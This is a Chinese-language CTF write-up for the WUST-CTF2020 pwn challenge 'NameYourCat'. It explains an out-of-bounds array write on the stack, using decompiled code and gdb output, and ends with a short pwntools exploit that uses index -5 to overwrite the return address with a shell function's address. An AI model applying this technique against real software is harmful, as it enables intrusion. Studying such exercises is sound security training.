
## NameYourCat
- 题目描述：
    
    > Author: ColdShield
- 题目附件：[NameYourCat](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/NameYourCat/NameYourCat)
- 考察点：数组越界
- 难度：简单
- 初始分值：1000
- 最终分值：997
- 完成人数：4

### 程序分析

和狗狗那题类似，出题人不是说喜欢喵嘛~ 这题只是把狗狗改成了喵，还是数组越界的漏洞。

### 解题思路

```c
unsigned int vulnerable(){
  int index; // ST20_4
  signed int i; // [esp+Ch] [ebp-3Ch]
  char Cats[40]; // [esp+14h] [ebp-34h]
  // ...
}
```

这次数组喵`Cats`是`vulnerable`中定义的临时变量

既然喵位于栈中，那么利用数组越界直接修改程序返回地址即可

```nasm
 ► 0x8048695 <NameWhich+99>     call   __isoc99_scanf@plt <0x80484b0>
        format: 0x804889f ◂— 0x733725 /* '%7s' */
        vararg: 0xffffcc54 —▸ 0xf7fe9790 ◂— pop    edx
```

查看返回地址：

```nasm
0e:0038│ ebp  0xffffcc28 —▸ 0xffffcc88 —▸ 0xffffcc98 ◂— 0x0
0f:003c│      0xffffcc2c —▸ 0x80486e9 (vulnerable+54) ◂— add    esp, 0x10
10:0040│      0xffffcc30 —▸ 0xffffcc54 —▸ 0xf7fe9790 ◂— pop    edx
```

偏移量：`(0xffffcc2c-0xffffcc54)/8=-5`

### exp
```python
shell = p32(0x080485CB)
sla('>','-5')
sla('Give your name plz: ',shell)
```



